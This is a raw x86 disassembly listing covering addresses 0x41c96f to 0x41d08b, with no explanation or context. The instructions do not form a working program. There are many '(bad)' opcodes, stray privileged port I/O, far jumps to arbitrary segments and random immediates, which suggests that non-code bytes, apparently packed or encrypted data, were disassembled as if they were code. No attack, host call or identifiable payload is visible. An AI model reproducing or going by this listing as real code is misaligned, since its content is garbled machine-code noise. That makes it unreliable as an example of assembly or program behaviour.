  41c96f:	dec    edx
  41c970:	pop    esp
  41c971:	ficom  WORD PTR [ebx-0x2a]
  41c974:	fwait
  41c975:	mov    bh,0xe8
  41c977:	and    eax,0x2150baa2
  41c97c:	int    0x8c
  41c97e:	inc    bp
  41c980:	icebp  
  41c981:	sub    BYTE PTR [ebx+eax*8+0x774f9bc],cl
  41c988:	icebp  
  41c989:	push   cs
  41c98a:	fistp  DWORD PTR [eax+0x34]
  41c98d:	mov    WORD PTR [ebp-0x6d],fs
  41c990:	jl     0x41c976
  41c992:	mov    fs,esp
  41c994:	adc    edx,DWORD PTR [edi+ebp*1+0x4d54d395]
  41c99b:	pop    edx
  41c99c:	jmp    0x34aaac1e
  41c9a1:	add    al,0xb4
  41c9a3:	retf   0x4c1c
  41c9a6:	cwde   
  41c9a7:	data16 jnp 0x41c9cd
  41c9aa:	push   esp
  41c9ab:	or     dl,bh
  41c9ad:	and    ah,BYTE PTR [edx-0x51]
  41c9b0:	mov    ds:0x5835a50,al
  41c9b5:	sbb    BYTE PTR [ebp-0x156460f4],ch
  41c9bb:	jnp    0x41c9be
  41c9bd:	push   ecx
  41c9be:	mov    ah,0x3d
  41c9c0:	and    edx,DWORD PTR ds:0x9732204f
  41c9c6:	out    0xbb,eax
  41c9c8:	jns    0x41c9d2
  41c9ca:	or     BYTE PTR [ecx-0x64],dl
  41c9cd:	(bad)
  41c9d1:	pushf  
  41c9d2:	adc    DWORD PTR [esi-0x30f2af80],ebx
  41c9d8:	mov    BYTE PTR [ebx],0x4c
  41c9db:	mov    WORD PTR ss:[esi],?
  41c9de:	xor    BYTE PTR ds:0x26d8,bh
  41c9e3:	into   
  41c9e4:	inc    edi
  41c9e5:	sub    DWORD PTR [eax],eax
  41c9e7:	outs   dx,DWORD PTR ds:[esi]
  41c9e8:	clc    
  41c9e9:	clc    
  41c9ea:	jecxz  0x41c999
  41c9ec:	dec    edx
  41c9ed:	lods   eax,DWORD PTR ds:[esi]
  41c9ee:	mov    edx,DWORD PTR [edx+0x68511eb9]
  41c9f4:	and    eax,0x6261d7e1
  41c9f9:	(bad)  
  41c9fa:	in     al,dx
  41c9fb:	push   ds
  41c9fc:	outs   dx,BYTE PTR ds:[esi]
  41c9fd:	xor    cl,dl
  41c9ff:	mov    BYTE PTR [ebp-0x46c09764],bl
  41ca05:	fcmove st,st(4)
  41ca07:	out    0xf1,al
  41ca09:	in     al,dx
  41ca0a:	rcl    eax,0xeb
  41ca0d:	cdq    
  41ca0e:	add    DWORD PTR [ebx],eax
  41ca10:	and    bl,BYTE PTR [edi+0x42]
  41ca13:	ss push edi
  41ca15:	into   
  41ca16:	sbb    esp,DWORD PTR [edi-0x44]
  41ca19:	mov    bh,dl
  41ca1b:	pop    esi
  41ca1c:	adc    esp,ebp
  41ca1e:	stc    
  41ca1f:	(bad)  
  41ca20:	lds    ecx,FWORD PTR [ecx]
  41ca22:	sbb    al,0xf9
  41ca24:	adc    al,0xf9
  41ca26:	mov    ds,WORD PTR [ecx+eax*1+0x49b7207]
  41ca2d:	(bad)  [edx]
  41ca2f:	add    DWORD PTR [eax+0x65],0xc5c4d767
  41ca36:	sub    BYTE PTR [ebp+esi*8-0x77],0xd2
  41ca3b:	shl    DWORD PTR [edi-0x6b],1
  41ca3e:	add    ch,BYTE PTR [eax+0x57]
  41ca41:	jb     0x41ca9a
  41ca43:	out    0x65,al
  41ca45:	imul   ebp,DWORD PTR [edx],0xffffff96
  41ca48:	jg     0x41c9d6
  41ca4a:	pop    ss
  41ca4b:	jle    0x41ca32
  41ca4d:	clc    
  41ca4e:	sbb    al,0x1d
  41ca50:	ins    BYTE PTR es:[edi],dx
  41ca51:	mov    bh,0x2b
  41ca53:	call   0x471f20ac
  41ca58:	push   esi
  41ca59:	das    
  41ca5a:	in     eax,dx
  41ca5b:	test   DWORD PTR [ebp+0x59],eax
  41ca5e:	sub    BYTE PTR [ecx+0x6d],al
  41ca61:	dec    eax
  41ca62:	jg     0x41ca9c
  41ca64:	push   cs
  41ca65:	ss inc sp
  41ca68:	adc    BYTE PTR [ecx-0x70],bh
  41ca6b:	mov    esi,DWORD PTR [ebp-0x35c71316]
  41ca71:	pop    esp
  41ca72:	sti    
  41ca73:	in     eax,0x84
  41ca75:	xchg   ecx,eax
  41ca76:	sub    BYTE PTR [ecx+0x61],ch
  41ca79:	imul   esp,DWORD PTR [eax+eax*1-0x20],0x71764723
  41ca81:	enter  0x78e6,0x3a
  41ca85:	(bad)  
  41ca87:	into   
  41ca88:	adc    DWORD PTR [esi+0x6c],eax
  41ca8b:	lods   al,BYTE PTR gs:[esi]
  41ca8d:	iret   
  41ca8e:	sub    BYTE PTR [eax+0x79],al
  41ca91:	rcr    BYTE PTR [eax+0x3826372b],0xe1
  41ca98:	and    eax,0xd512b7b8
  41ca9d:	mov    ds:0xebb2417a,eax
  41caa2:	and    eax,0xdc0b845c
  41caa7:	sbb    ebp,DWORD PTR [eax-0x73]
  41caaa:	shl    DWORD PTR [ebp+eax*1+0x6a7c2999],0xab
  41cab2:	push   ecx
  41cab3:	sbb    edx,ebp
  41cab5:	xor    BYTE PTR [ebx+0x40],0x3b
  41cab9:	adc    eax,0xeee2944d
  41cabe:	adc    ch,BYTE PTR [ecx+ebx*1-0x33231974]
  41cac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cac6:	(bad)  
  41cac7:	mov    ds:0xd33613c4,al
  41cacc:	enter  0xdb1b,0xca
  41cad0:	stc    
  41cad1:	inc    esp
  41cad2:	mov    edi,0xb02538ae
  41cad7:	xchg   edx,eax
  41cad8:	push   esp
  41cad9:	aad    0x59
  41cadb:	mov    ah,BYTE PTR [eax+eax*8]
  41cade:	(bad)  
  41cae0:	mov    esp,0xf0086bda
  41cae5:	mov    al,ds:0x3e9b7344
  41caea:	int3   
  41caeb:	xchg   BYTE PTR [esi+0x6d0f8497],bh
  41caf1:	cmp    eax,0xc8f563f9
  41caf6:	xor    esp,DWORD PTR [edi-0x5599c3e7]
  41cafc:	ret    0x15d8
  41caff:	ret    0x11b8
  41cb02:	mov    DWORD PTR [edx],eax
  41cb04:	add    esp,ebp
  41cb06:	jbe    0x41cb2c
  41cb08:	imul   eax,ecx,0x15
  41cb0b:	or     al,0xc5
  41cb0d:	or     eax,0xfbd965ce
  41cb12:	inc    ebx
  41cb13:	in     al,dx
  41cb14:	dec    esp
  41cb15:	push   ebp
  41cb16:	push   cs
  41cb17:	imul   ebx,DWORD PTR [edi+ecx*2-0x292637cd],0xffffffc7
  41cb1f:	aas    
  41cb20:	loope  0x41cb8a
  41cb22:	jno    0x41cb56
  41cb24:	dec    edx
  41cb25:	jmp    0x53231d01
  41cb2a:	fld    st(7)
  41cb2c:	xor    esp,DWORD PTR [ecx+0x2]
  41cb2f:	and    BYTE PTR [ebp-0x491b1dc],ch
  41cb35:	mov    eax,0x61ca83e1
  41cb3a:	pop    edx
  41cb3b:	push   ecx
  41cb3c:	xchg   edx,eax
  41cb3d:	outs   dx,BYTE PTR ds:[esi]
  41cb3e:	adc    ebp,DWORD PTR [eax+edx*1+0x58e9eec1]
  41cb45:	sbb    eax,0x3fe9982d
  41cb4a:	mov    bh,0x43
  41cb4c:	and    BYTE PTR [eax+0x134422bd],ah
  41cb52:	inc    esp
  41cb53:	jnp    0x41cb1e
  41cb55:	gs js  0x41cb87
  41cb58:	push   0x39
  41cb5a:	mov    edi,0x48376c02
  41cb5f:	sbb    cl,BYTE PTR [ecx]
  41cb61:	cmp    eax,0xf068cae4
  41cb66:	mov    ch,0xd2
  41cb68:	pop    es
  41cb69:	iret   
  41cb6a:	mov    edi,0x4dad1360
  41cb6f:	lods   eax,DWORD PTR ds:[esi]
  41cb70:	push   edx
  41cb71:	push   eax
  41cb72:	pop    ds
  41cb73:	adc    BYTE PTR ds:[eax+0x2a],0xb
  41cb78:	sub    dl,BYTE PTR [edi-0x328d2a37]
  41cb7e:	aam    0xe8
  41cb80:	mov    cl,0xce
  41cb82:	test   BYTE PTR [edx],cl
  41cb84:	loop   0x41cbb7
  41cb86:	adc    BYTE PTR [edx+esi*1+0x60],0x0
  41cb8b:	jnp    0x41cb9e
  41cb8d:	iret   
  41cb8e:	mov    ecx,0x74a98b12
  41cb93:	cld    
  41cb94:	inc    ebp
  41cb95:	mov    ds:0xfa4dfe0a,al
  41cb9a:	ds sbb eax,0xbce8a8d3
  41cba0:	out    dx,al
  41cba1:	cmp    ebx,esi
  41cba3:	or     bl,bl
  41cba5:	jmp    0x41cbb1
  41cba7:	ja     0x41cbc5
  41cba9:	idiv   ebp
  41cbab:	iret   
  41cbac:	mov    esi,0x911c490a
  41cbb1:	sbb    dl,BYTE PTR [ecx]
  41cbb3:	shl    BYTE PTR [ebx],1
  41cbb5:	mov    dl,0x1d
  41cbb7:	mov    al,0xea
  41cbb9:	or     eax,0xbdd8a41b
  41cbbe:	ret    
  41cbbf:	cmc    
  41cbc0:	repz xchg ebp,eax
  41cbc2:	lock out 0x4d,al
  41cbc5:	lock (bad) 
  41cbc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbc8:	cmp    al,0x9f
  41cbca:	aam    0x69
  41cbcc:	stc    
  41cbcd:	xchg   esi,eax
  41cbce:	rcl    BYTE PTR [esi+0x4],1
  41cbd1:	fdivr  DWORD PTR [ecx+0x1fecabf2]
  41cbd7:	adc    BYTE PTR [edi],0xb4
  41cbda:	lds    eax,FWORD PTR [edx+0x67079b13]
  41cbe0:	idiv   DWORD PTR [eax]
  41cbe2:	push   ebx
  41cbe3:	aaa    
  41cbe4:	xchg   ebp,eax
  41cbe5:	das    
  41cbe6:	imul   DWORD PTR [ebx]
  41cbe8:	inc    edi
  41cbe9:	jbe    0x41cc45
  41cbeb:	outs   dx,BYTE PTR ds:[esi]
  41cbec:	pop    es
  41cbed:	push   edx
  41cbee:	sbb    dh,BYTE PTR ds:0xb0afdf1c
  41cbf4:	jbe    0x41cc3e
  41cbf6:	mov    dl,0x5f
  41cbf8:	push   ebx
  41cbf9:	pop    eax
  41cbfa:	out    dx,al
  41cbfb:	or     eax,DWORD PTR [ebx-0x67326126]
  41cc01:	ss xchg esp,eax
  41cc03:	int3   
  41cc04:	(bad)  
  41cc05:	ds jae 0x41cc78
  41cc08:	xor    BYTE PTR [ebx-0x53597acc],ch
  41cc0e:	ins    DWORD PTR es:[edi],dx
  41cc0f:	dec    esi
  41cc10:	pop    esp
  41cc11:	xchg   ecx,eax
  41cc12:	pop    eax
  41cc13:	dec    ebx
  41cc14:	jecxz  0x41cbfe
  41cc16:	jae    0x41cbad
  41cc18:	clc    
  41cc19:	mov    al,0x4b
  41cc1b:	fnstenv gs:[ebx+0x4c]
  41cc1f:	mov    esi,0xec05ab1f
  41cc24:	jb     0x41cc95
  41cc26:	mov    eax,ds:0xe21b01d3
  41cc2b:	mov    edx,0x271734f9
  41cc30:	sbb    eax,0xf5701dc4
  41cc35:	loope  0x41cc65
  41cc37:	test   DWORD PTR ds:0x6ca63f5e,ebx
  41cc3d:	js     0x41cc71
  41cc3f:	xor    al,0x5c
  41cc41:	jp     0x41cc82
  41cc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc44:	cmp    dh,BYTE PTR [ebp-0x58]
  41cc47:	cmp    cl,BYTE PTR [edx+eiz*8+0x12]
  41cc4b:	and    al,0xb1
  41cc4d:	les    edi,FWORD PTR [esi+0x5c46b6d2]
  41cc53:	(bad)  
  41cc54:	pop    esp
  41cc55:	jne    0x41cc76
  41cc57:	das    
  41cc58:	push   esp
  41cc59:	sub    cl,al
  41cc5b:	lods   al,BYTE PTR ds:[esi]
  41cc5c:	int3   
  41cc5d:	sub    BYTE PTR [edi+0x12],bh
  41cc60:	ret    0x4d65
  41cc63:	jnp    0x41cc9a
  41cc65:	fisub  DWORD PTR [ecx+ebp*8-0x2d98e9b]
  41cc6c:	push   eax
  41cc6d:	xor    BYTE PTR [esi],0xc5
  41cc70:	dec    ebx
  41cc71:	xor    eax,0x3ebceae
  41cc76:	repnz repz add al,0x2a
  41cc7a:	cs mov ah,0x88
  41cc7d:	outs   dx,DWORD PTR ds:[esi]
  41cc7e:	pop    esi
  41cc7f:	loop   0x41cc2c
  41cc81:	pop    edx
  41cc82:	push   0xffffffe3
  41cc84:	sahf   
  41cc85:	pop    esp
  41cc86:	imul   eax,DWORD PTR [edx-0x39],0xffffffd5
  41cc8a:	cmp    BYTE PTR [esi+0x67],dh
  41cc8d:	push   esp
  41cc8e:	xor    bh,BYTE PTR [ebp-0x6d3515ec]
  41cc94:	jecxz  0x41cc5c
  41cc96:	sub    ecx,eax
  41cc98:	ins    DWORD PTR es:[edi],dx
  41cc99:	push   ebx
  41cc9a:	enter  0x7a10,0xea
  41cc9e:	call   0x6b176e18
  41cca3:	inc    eax
  41cca4:	out    0x4c,eax
  41cca6:	xchg   esp,eax
  41cca7:	outs   dx,BYTE PTR ds:[esi]
  41cca8:	mov    ah,0x4a
  41ccaa:	xor    eax,DWORD PTR [edi-0x4b]
  41ccad:	and    eax,0x7b929c3c
  41ccb2:	je     0x41cd0f
  41ccb4:	iret   
  41ccb5:	jp     0x41cc4c
  41ccb7:	fld    TBYTE PTR [ecx+0x32]
  41ccba:	pusha  
  41ccbb:	push   ss
  41ccbc:	jl     0x41cc59
  41ccbe:	scas   eax,DWORD PTR es:[edi]
  41ccbf:	sbb    bl,BYTE PTR [edi+esi*2-0x4a610b2d]
  41ccc6:	mov    bh,0xff
  41ccc8:	outs   dx,DWORD PTR ds:[esi]
  41ccc9:	imul   eax,DWORD PTR [eax],0xffffffa0
  41cccc:	mov    eax,0x1c5c1caf
  41ccd1:	push   ss
  41ccd2:	mov    si,0xab6d
  41ccd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd7:	pop    ds
  41ccd8:	jg     0x41cd4a
  41ccda:	popa   
  41ccdb:	push   0x67
  41ccdd:	dec    esi
  41ccde:	push   esp
  41ccdf:	push   ebp
  41cce0:	arpl   si,cx
  41cce2:	enter  0x4de3,0x1d
  41cce6:	xor    al,0x3d
  41cce8:	xor    dh,BYTE PTR ds:0xe4306ae9
  41ccee:	xchg   edx,eax
  41ccef:	add    dh,BYTE PTR [edx+0xa]
  41ccf2:	mov    dh,0x85
  41ccf4:	push   eax
  41ccf5:	nop
  41ccf6:	mov    ch,0x8a
  41ccf8:	mov    dl,0xa9
  41ccfa:	push   edx
  41ccfb:	xchg   esi,eax
  41ccfc:	lods   eax,DWORD PTR ds:[esi]
  41ccfd:	ret    
  41ccfe:	ja     0x41cca9
  41cd00:	add    ah,BYTE PTR [ebx+esi*1]
  41cd03:	dec    esi
  41cd04:	xchg   edi,eax
  41cd05:	sub    BYTE PTR [edx],0x4d
  41cd08:	xor    BYTE PTR [esi],bl
  41cd0a:	jnp    0x41cce9
  41cd0c:	lods   eax,DWORD PTR ds:[esi]
  41cd0d:	cs dec ebp
  41cd0f:	mov    dh,BYTE PTR [eax+0x29c550d5]
  41cd15:	jmp    0xa225:0x2fb19dde
  41cd1c:	test   al,0xb5
  41cd1e:	repnz sbb DWORD PTR [ecx-0x68d81c69],esp
  41cd25:	dec    eax
  41cd26:	ret    0x88cf
  41cd29:	xchg   DWORD PTR [ecx],ecx
  41cd2b:	jl     0x41cd2f
  41cd2d:	and    eax,0x370ee386
  41cd32:	adc    eax,0xde650a33
  41cd37:	cmp    dh,BYTE PTR [eax-0x39]
  41cd3a:	in     eax,dx
  41cd3b:	lods   eax,DWORD PTR ds:[esi]
  41cd3c:	repz arpl WORD PTR [edx],dx
  41cd3f:	jecxz  0x41cdaf
  41cd41:	dec    ecx
  41cd42:	in     al,0xab
  41cd44:	ret    0x3a0b
  41cd47:	sub    ch,bh
  41cd49:	sub    ebp,DWORD PTR [esi]
  41cd4b:	adc    BYTE PTR [ecx-0x63],0x28
  41cd4f:	cwde   
  41cd50:	stos   DWORD PTR es:[edi],eax
  41cd51:	sbb    eax,0x8faef92b
  41cd56:	pushf  
  41cd57:	out    dx,al
  41cd58:	icebp  
  41cd59:	xor    al,0xf4
  41cd5b:	into   
  41cd5c:	push   edi
  41cd5d:	xor    BYTE PTR [ebp+0x132a5afc],cl
  41cd63:	push   eax
  41cd64:	cmp    edx,DWORD PTR [eax+0x356b3bfa]
  41cd6a:	ss mov dh,0x84
  41cd6d:	dec    esp
  41cd6e:	retf   
  41cd6f:	sub    DWORD PTR [edi+0x15e527d9],0x1fd6ee98
  41cd79:	sub    ecx,esp
  41cd7b:	mov    ch,ch
  41cd7d:	mov    edx,0x54c13b61
  41cd82:	and    DWORD PTR [ecx-0x79],0xa670feb
  41cd89:	cmp    bl,BYTE PTR [esi+0x3bd644ac]
  41cd8f:	retf   0xed9
  41cd92:	cmp    eax,0xf3857db4
  41cd97:	sbb    edx,DWORD PTR [edx+edx*2]
  41cd9a:	xor    al,ah
  41cd9c:	mov    ch,0x3c
  41cd9e:	test   eax,0x60166b3b
  41cda3:	hlt    
  41cda4:	jge    0x41cdda
  41cda6:	mov    al,0x39
  41cda8:	retf   0x9d41
  41cdab:	lods   eax,DWORD PTR ds:[esi]
  41cdac:	cdq    
  41cdad:	sub    ebx,DWORD PTR [ebx-0x2280fad2]
  41cdb3:	push   ss
  41cdb4:	call   0x1a50db58
  41cdb9:	bound  esi,QWORD PTR [ecx+0x4a]
  41cdbc:	pop    ebp
  41cdbd:	cmp    BYTE PTR [eax+esi*2],ch
  41cdc0:	aaa    
  41cdc1:	pop    ebx
  41cdc2:	cmc    
  41cdc3:	sbb    al,0xc0
  41cdc5:	fwait
  41cdc6:	dec    ecx
  41cdc7:	pop    es
  41cdc8:	je     0x41cd4f
  41cdca:	jmp    0xb54:0x545705b0
  41cdd1:	pop    esp
  41cdd2:	jb     0x41ce51
  41cdd4:	sub    dl,bh
  41cdd6:	sbb    ecx,DWORD PTR [edx]
  41cdd8:	std    
  41cdd9:	std    
  41cdda:	les    ebp,FWORD PTR [ebx+0x43ca5efa]
  41cde0:	lods   al,BYTE PTR ds:[esi]
  41cde1:	xchg   BYTE PTR cs:[edx+0x51],bh
  41cde5:	lahf   
  41cde6:	int    0x96
  41cde8:	retf   
  41cde9:	repnz sbb al,bh
  41cdec:	pop    ebx
  41cded:	jmp    FWORD PTR [edi-0x7b]
  41cdf0:	and    al,BYTE PTR [edx-0x19]
  41cdf3:	gs lock stos DWORD PTR es:[edi],eax
  41cdf6:	mov    cl,0x61
  41cdf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdf9:	cmp    esi,DWORD PTR [esi+eiz*8-0x57]
  41cdfd:	cmp    edi,DWORD PTR [esi]
  41cdff:	sbb    BYTE PTR [ebp-0x67],dl
  41ce02:	xchg   ch,ch
  41ce04:	hlt    
  41ce05:	cmp    eax,0xddb9f0c5
  41ce0a:	xchg   esi,eax
  41ce0b:	aas    
  41ce0c:	(bad)  
  41ce0d:	fdiv   QWORD PTR [edx]
  41ce0f:	(bad)  
  41ce10:	fistp  WORD PTR [esi]
  41ce12:	mov    esp,0xf4f92113
  41ce17:	xchg   ebx,eax
  41ce18:	nop
  41ce19:	bound  eax,QWORD PTR [esi]
  41ce1b:	push   ebp
  41ce1c:	or     cl,BYTE PTR [esi+0x4d]
  41ce1f:	inc    esp
  41ce20:	jmp    0xcbecd2ba
  41ce25:	fnstsw WORD PTR [ecx]
  41ce27:	int3   
  41ce28:	jb     0x41cea6
  41ce2a:	mov    edx,?
  41ce2c:	mov    ebp,0xbdaafaea
  41ce31:	xlat   BYTE PTR ds:[ebx]
  41ce32:	inc    ebp
  41ce33:	lods   eax,DWORD PTR ds:[esi]
  41ce34:	lea    ecx,[esi-0x5110ed7d]
  41ce3a:	sub    ch,BYTE PTR [ecx+ebx*2]
  41ce3d:	jmp    0x7e64cd30
  41ce42:	in     al,0x66
  41ce44:	(bad)  
  41ce45:	test   al,0x69
  41ce47:	call   0x93e6:0x528b07b4
  41ce4e:	leave  
  41ce4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce50:	in     eax,0x4e
  41ce52:	inc    edx
  41ce53:	pmulhw mm6,mm4
  41ce56:	mov    BYTE PTR [esi+ebx*2+0x3e],dl
  41ce5a:	jmp    0x41ced5
  41ce5c:	(bad)  
  41ce5d:	cmp    eax,0xeb8663bf
  41ce62:	pop    esp
  41ce63:	(bad)  [ebp-0x5f]
  41ce66:	jne    0x41ce91
  41ce68:	xlat   BYTE PTR ds:[ebx]
  41ce69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce6a:	dec    edx
  41ce6b:	int3   
  41ce6c:	or     BYTE PTR [eax-0x4dbe9c1a],bh
  41ce72:	inc    ebx
  41ce73:	pusha  
  41ce74:	jo     0x41ce19
  41ce76:	arpl   WORD PTR ds:0x5608a00b,ax
  41ce7c:	mov    ds:0x1dc26db1,eax
  41ce81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce82:	jne    0x41ced1
  41ce84:	pop    esi
  41ce85:	cld    
  41ce86:	std    
  41ce87:	test   eax,0x90e41849
  41ce8c:	xor    eax,0x5568de7b
  41ce91:	jle    0x41ce93
  41ce93:	cmp    BYTE PTR [edi+0x7c],dh
  41ce96:	in     al,0xf0
  41ce98:	arpl   WORD PTR [ebx],sp
  41ce9a:	pop    ds
  41ce9b:	fistp  DWORD PTR [ebx-0x2d]
  41ce9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce9f:	sub    al,0x13
  41cea1:	popa   
  41cea2:	mov    al,ds:0x41ab5e1d
  41cea7:	lods   eax,DWORD PTR ds:[esi]
  41cea8:	mov    ebx,0xc4f15ceb
  41cead:	in     al,dx
  41ceae:	mov    ch,0xdc
  41ceb0:	adc    al,0x17
  41ceb2:	idiv   DWORD PTR es:[ecx+0x7b6ee183]
  41ceb9:	div    ecx
  41cebb:	imul   esp,DWORD PTR [ebx-0x69],0x7
  41cebf:	icebp  
  41cec0:	(bad)  
  41cec1:	cmp    DWORD PTR ds:[ebx+edi*2+0xe],ecx
  41cec6:	repz pop ds
  41cec8:	add    edi,DWORD PTR [ebp-0x57163880]
  41cece:	div    DWORD PTR [ecx+0x4a4c338]
  41ced4:	inc    edi
  41ced5:	jne    0x41cf39
  41ced7:	adc    bh,BYTE PTR [eax]
  41ced9:	adc    al,0xa5
  41cedb:	sub    BYTE PTR [esi+0x1031dd91],cl
  41cee1:	cmc    
  41cee2:	in     eax,dx
  41cee3:	fisttp WORD PTR [ebx+0x17]
  41cee6:	pusha  
  41cee7:	out    dx,eax
  41cee8:	push   edi
  41cee9:	pop    ds
  41ceea:	daa    
  41ceeb:	inc    edx
  41ceec:	fstp   QWORD PTR [ebp+0xa]
  41ceef:	cmp    al,0x32
  41cef1:	stc    
  41cef2:	(bad)
  41cef6:	inc    esp
  41cef7:	ins    DWORD PTR es:[edi],dx
  41cef8:	xor    DWORD PTR [ebx],ecx
  41cefa:	pop    ss
  41cefb:	xchg   dh,ch
  41cefd:	add    cl,ch
  41ceff:	pop    esi
  41cf00:	jns    0x41cede
  41cf02:	shr    BYTE PTR [ebp-0x4699361e],0x35
  41cf09:	cmp    eax,0x1de0980
  41cf0e:	jmp    0x41ceb1
  41cf10:	daa    
  41cf11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf12:	xchg   edx,eax
  41cf13:	adc    DWORD PTR [edx],eax
  41cf15:	ss xor al,0xee
  41cf18:	lods   eax,DWORD PTR ds:[esi]
  41cf19:	loop   0x41cf31
  41cf1b:	call   0xbc4d:0xf4e7272c
  41cf22:	sbb    BYTE PTR [ebx],0xab
  41cf25:	add    al,BYTE PTR [edx+ecx*8-0x53]
  41cf29:	xchg   edx,eax
  41cf2a:	jno    0x41cf14
  41cf2c:	push   es
  41cf2d:	fnstcw WORD PTR [ebp-0xf4c9fd]
  41cf33:	stc    
  41cf34:	push   ecx
  41cf35:	dec    edi
  41cf36:	jp     0x41cf7c
  41cf38:	cmp    ah,BYTE PTR [edx]
  41cf3a:	jge    0x41cf3e
  41cf3c:	out    dx,al
  41cf3d:	xchg   ebp,eax
  41cf3e:	pop    ss
  41cf3f:	retf   
  41cf40:	call   0xf21bd396
  41cf45:	cdq    
  41cf46:	ret    0xe395
  41cf49:	xchg   ebx,eax
  41cf4a:	cmp    eax,0x3cec3021
  41cf4f:	ror    DWORD PTR [ebp+0x3ac54296],1
  41cf55:	pop    ecx
  41cf56:	mov    eax,0xb0b25051
  41cf5b:	nop
  41cf5c:	push   0x55
  41cf5e:	ret    
  41cf5f:	dec    edx
  41cf60:	push   edx
  41cf61:	mov    eax,esi
  41cf63:	lds    ecx,FWORD PTR [edi+0x51]
  41cf66:	bound  esi,QWORD PTR [esi+esi*2-0x43]
  41cf6a:	leave  
  41cf6b:	mov    esp,0x7b224ea2
  41cf70:	repnz adc al,0x59
  41cf73:	sub    ebp,ebx
  41cf75:	ficom  DWORD PTR [ecx+0xc75e725]
  41cf7b:	out    0xda,eax
  41cf7d:	daa    
  41cf7e:	stc    
  41cf7f:	and    al,0x5
  41cf81:	push   edx
  41cf82:	scas   al,BYTE PTR es:[edi]
  41cf83:	jge    0x41cfda
  41cf85:	and    BYTE PTR [edi],bh
  41cf87:	or     BYTE PTR [edi+0x43],dh
  41cf8a:	scas   al,BYTE PTR es:[edi]
  41cf8b:	cmp    esi,DWORD PTR [edx-0x1d]
  41cf8e:	add    WORD PTR [esi-0x3d2651cc],0xffb5
  41cf96:	pop    ebx
  41cf97:	mov    edx,DWORD PTR [ebp+0x4e00d149]
  41cf9d:	xor    eax,0xc5c14408
  41cfa2:	(bad)  
  41cfa3:	pop    eax
  41cfa4:	push   ss
  41cfa5:	leave  
  41cfa6:	dec    esi
  41cfa7:	loopne 0x41cfd1
  41cfa9:	or     eax,0xe92b9761
  41cfae:	rol    DWORD PTR [eax],0xfc
  41cfb1:	push   0xfc2082af
  41cfb6:	sbb    cl,BYTE PTR [esp+ebp*4]
  41cfb9:	dec    edi
  41cfba:	xchg   ecx,eax
  41cfbb:	or     DWORD PTR [ebp+0x3f],esp
  41cfbe:	sub    DWORD PTR [edi+0x6f],esi
  41cfc1:	bound  ebx,QWORD PTR [edx-0x31a6cf09]
  41cfc7:	and    edi,DWORD PTR [edi+edx*4]
  41cfca:	ret    
  41cfcb:	fistp  WORD PTR [ebp-0x61]
  41cfce:	pusha  
  41cfcf:	push   eax
  41cfd0:	and    edx,DWORD PTR [ebp-0x2bf3b23c]
  41cfd6:	adc    al,0xce
  41cfd8:	inc    ebx
  41cfd9:	push   ebp
  41cfda:	xor    BYTE PTR [ecx+0x3157948c],0xd8
  41cfe1:	dec    esp
  41cfe2:	jg     0x41d00c
  41cfe4:	jb     0x41cfa6
  41cfe6:	cld    
  41cfe7:	mov    al,0x40
  41cfe9:	xchg   esi,eax
  41cfea:	or     eax,0x208177d4
  41cfef:	adc    al,0x5d
  41cff1:	ins    BYTE PTR es:[edi],dx
  41cff2:	adc    eax,0xe18aacc6
  41cff7:	mov    ebx,0xd8255252
  41cffc:	out    dx,eax
  41cffd:	mov    DWORD PTR [ecx+0x16],ecx
  41d000:	(bad)  
  41d001:	dec    edi
  41d002:	sub    ah,ah
  41d004:	test   dh,dh
  41d006:	mov    bh,0xdc
  41d008:	retf   
  41d009:	pop    ss
  41d00a:	fwait
  41d00b:	cld    
  41d00c:	dec    esi
  41d00d:	hlt    
  41d00e:	xchg   ecx,eax
  41d00f:	sti    
  41d010:	out    dx,eax
  41d011:	xchg   ebp,eax
  41d012:	mov    edx,DWORD PTR [edx-0x686b423d]
  41d018:	ins    BYTE PTR es:[edi],dx
  41d019:	out    dx,al
  41d01a:	cld    
  41d01b:	jp     0x41d063
  41d01d:	loopne 0x41d028
  41d01f:	icebp  
  41d020:	adc    DWORD PTR [ecx+0x27],0x3bed12a0
  41d027:	pop    edi
  41d028:	add    edi,ebp
  41d02a:	arpl   WORD PTR [ebx-0x55],bx
  41d02d:	ins    DWORD PTR es:[edi],dx
  41d02e:	(bad)  
  41d02f:	and    eax,ecx
  41d031:	inc    ebp
  41d032:	sbb    eax,edi
  41d034:	clc    
  41d035:	sub    DWORD PTR [eax+0x77],edx
  41d038:	and    eax,DWORD PTR [eax]
  41d03a:	loopne 0x41d00f
  41d03c:	pop    edx
  41d03d:	ror    DWORD PTR [esi+0x17],cl
  41d040:	je     0x41d029
  41d042:	imul   BYTE PTR [ebx-0x7b47b5fa]
  41d048:	pop    es
  41d049:	mov    ebx,ebx
  41d04b:	adc    al,0xdc
  41d04d:	dec    edx
  41d04e:	mov    esp,0x4d1addf
  41d053:	pop    esp
  41d054:	cld    
  41d055:	xchg   ebx,eax
  41d056:	popa   
  41d057:	mov    dh,0xfe
  41d059:	cdq    
  41d05a:	jns    0x41cfeb
  41d05c:	scas   al,BYTE PTR es:[edi]
  41d05d:	scas   eax,DWORD PTR es:[edi]
  41d05e:	mov    edi,0xfd11089f
  41d063:	mov    fs,WORD PTR [ebx-0x11]
  41d066:	cwde   
  41d067:	mov    ds,WORD PTR [eax-0x42311445]
  41d06d:	inc    eax
  41d06e:	ss xchg ebx,eax
  41d070:	sbb    BYTE PTR [ebx],0x28
  41d073:	retf   
  41d074:	mov    eax,0xdbf75c1f
  41d079:	loop   0x41d043
  41d07b:	jo     0x41d0af
  41d07d:	lods   al,BYTE PTR ds:[esi]
  41d07e:	push   ebx
  41d07f:	fsubr  DWORD PTR [ebx+ebx*1]
  41d082:	cli    
  41d083:	xor    al,0xee
  41d085:	push   ebx
  41d086:	adc    esi,DWORD PTR [eax-0x27]
  41d089:	sahf   
  41d08a:	xchg   ebx,eax
  41d08b:	or     al,0xee
